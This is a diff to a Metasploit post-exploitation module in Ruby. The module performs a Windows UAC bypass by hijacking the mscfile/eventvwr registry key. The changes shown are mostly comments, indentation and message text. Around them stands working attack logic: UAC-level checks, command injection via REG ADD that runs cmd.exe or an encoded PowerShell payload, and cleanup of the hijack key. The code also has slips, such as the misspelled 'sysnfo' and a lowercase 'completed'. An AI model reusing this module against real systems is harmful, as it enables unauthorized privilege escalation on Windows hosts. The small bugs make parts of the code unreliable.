@@ -68,8 +68,8 @@
 # In some linux distributions postgresql need to be started and
 # metasploit database deleted/rebuild to be abble to load module.
 # 1 - /etc/init.d/postgresql start
-# 2 - msfdb delete
-# 3 - msfdb init
+# 2 - msfdb delete (optional)
+# 3 - msfdb init   (optional)
 # 4 - msfconsole
 # 5 - reload_all
 ##
@@ -192,39 +192,39 @@ def ls_stage1
     # search in target regedit if eventvwr calls mmc.exe
     print_warning("Reading proccess registry hive keys...")
     Rex::sleep(1.0)
-    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
+    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command") # mmc.exe call registry key
       print_good("  exec => remote registry hive key found!")
       Rex::sleep(1.0)
     else
-       # registry hive key not found, aborting module execution.
-       print_warning("Hive key: HKCR\\mscfile\\shell\\open\\command (mmc.exe call)")
-       print_error("[ABORT]: module cant find the registry hive key needed...")
-       print_error("System does not appear to be vulnerable to the exploit code!")
-       print_line("")
-       Rex::sleep(1.0)
-       return nil
-    end
-
-    # check target UAC settings (always notify - will abort module execution)
-    check_success = registry_getvaldata("#{uac_hivek}","#{uac_level}")
-    if check_success == 2
-       print_warning("Target UAC set to: always notify")
-       print_error("[ABORT]: module can not work under this condictions...")
-       print_error("Remote system its not vulnerable to the exploit code!")
-       print_line("")
-       Rex::sleep(1.0)
+      # registry hive key not found, aborting module execution.
+      print_warning("Hive key: HKCR\\mscfile\\shell\\open\\command (mmc.exe call)")
+      print_error("[ABORT]: module cant find the registry hive key needed...")
+      print_error("System does not appear to be vulnerable to the exploit code!")
+      print_line("")
+      Rex::sleep(1.0)
       return nil
     end
 
-      #
-      # chose to execute a single command in cmd.exe syntax logic
-      # or to execute a shellcode(base64) string using powershell.exe
-      #
-      if datastore['USE_POWERSHELL'] == true
-        comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
-      else
-        comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
+      # check target UAC settings (always notify - will abort module execution)
+      check_success = registry_getvaldata("#{uac_hivek}","#{uac_level}")
+      if check_success == 2 # a dword:2 value it means 'always notify' setting is active.
+        print_warning("Target UAC set to: always notify")
+        print_error("[ABORT]: module can not work under this condictions...")
+        print_error("Remote system its not vulnerable to the exploit code!")
+        print_line("")
+        Rex::sleep(1.0)
+        return nil
       end
+
+        #
+        # chose to execute a single command in cmd.exe syntax logic
+        # or to execute a shellcode(base64) string using powershell.exe
+        #
+        if datastore['USE_POWERSHELL'] == true
+          comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
+        else
+          comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
+        end
 
  # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
@@ -300,7 +300,7 @@ def ls_stage2
       if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
         print_error("Module can not verify if deletion has successefully!")
       else
-        print_good("  exec => registry hive keys deleted successefuly!")
+        print_status("Registry hive keys deleted successefuly!")
       end
 
     Rex::sleep(1.0)
@@ -343,7 +343,7 @@ def ls_stage3
 
     print_warning("Reading proccess registry hive keys...")
     Rex::sleep(2.0)
-    # check target registry hive/key settings
+    # check target registry hive/key settings (mmc.exe call)
     if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
       report_on = "EXPLOITABLE"
     else
@@ -351,7 +351,7 @@ def ls_stage3
       report_on = "NOT EXPLOITABLE"
     end
 
-      # check target registry hive/key settings
+      # check target registry hive/key settings (hijacking key)
       if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
         report_tw = "HIJACK HIVE PRESENT"
       else
@@ -359,12 +359,12 @@ def ls_stage3
         report_tw = "HIJACK HIVE NOT PRESENT"
       end
 
-    # check target registry hive/key settings
+    # check target registry hive/key settings (UAC level settings)
     check_uac = registry_getvaldata("#{uac_hivek}","#{uac_level}")
     if check_uac == 2
-      report_level = "always notify (not exploitable)"
+      report_level = "ALWAYS NOTIFY (NOT EXPLOITABLE)"
     else
-      report_level = "#{check_uac} (exploitable)"
+      report_level = "#{check_uac} (EXPLOITABLE)"
     end
 
   print_line("")
@@ -413,11 +413,20 @@ def run
     print_line("")
 
 
+    #
+    # the 'def check' funtion that rapid7 requires to accept new modules.
+    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
+    #
+    # check for proper operative system (windows)
+    if client.platform !~ /win32|win64/i
+      print_error("[ ABORT ]: This module only works againts windows systems!")
+      raise Rex::Script::completed
+    end
     # check for proper session (meterpreter)
     if not sysinfo.nil?
       print_status("Running module against: #{sysnfo['Computer']}")
     else
-      print_error("[ ABORT ]: This module only works against meterpreter sessions")
+      print_error("[ ABORT ]: This module only works against meterpreter sessions!")
       raise Rex::Script::Completed
     end
     # elevate session privileges befor runing options
